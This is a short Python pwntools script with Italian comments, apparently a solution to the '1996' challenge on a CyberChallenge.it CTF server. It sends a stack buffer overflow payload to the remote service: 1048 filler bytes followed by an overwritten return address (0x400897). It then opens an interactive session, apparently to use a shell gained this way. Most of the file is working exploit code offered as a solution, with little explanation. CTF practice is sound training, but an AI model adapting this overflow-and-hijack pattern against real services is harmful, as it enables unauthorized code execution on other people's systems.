#!/usr/bin/env python3

# Importa la libreria di pwntools
from pwn import *


def main():
    '''
    remote(hostname, port) apre una socket e ritorna un object
    che può essere usato per inviare e ricevere dati sulla socket  
    '''
    HOST = "1996.challs.cyberchallenge.it"
    PORT = 9121
    r = remote(HOST, PORT)

    # .send() può essere invocato sull'oggetto ritornato da remote() per inviare dati
    #r.send(b"Ciao!")

    # .sendline() è identico a .send(), però appende un newline dopo i dati
    #r.sendline(b"Ciao!")

    # .sendafter() e .sendlineafter() inviano la stringa "Ciao!"
    #r.sendafter(b"... Invia un qualsiasi carattere per iniziare ...", b"k")


    # .recvuntil() legge dalla socket finchè non viene incontrata la stringa "something"

    buff = "x" * 1048
    buff_bytes = str.encode(buff)
    payload = buff_bytes + p64(0x400897, endianness='little');
    print(type(payload))
    print(payload)
    r.sendlineafter(b"Which environment variable do you want to read? ", payload)

    #data = r.recv(2048)
    #print(data)

    #data = r.recv(2048)
    #print(data)
    #
    #data = r.recv(2048)
    #print(data)

    # permette di interagire con la connessione direttamente dalla shell
    r.interactive()

    # chiude la socket
    r.close()


if __name__ == "__main__":
    main()
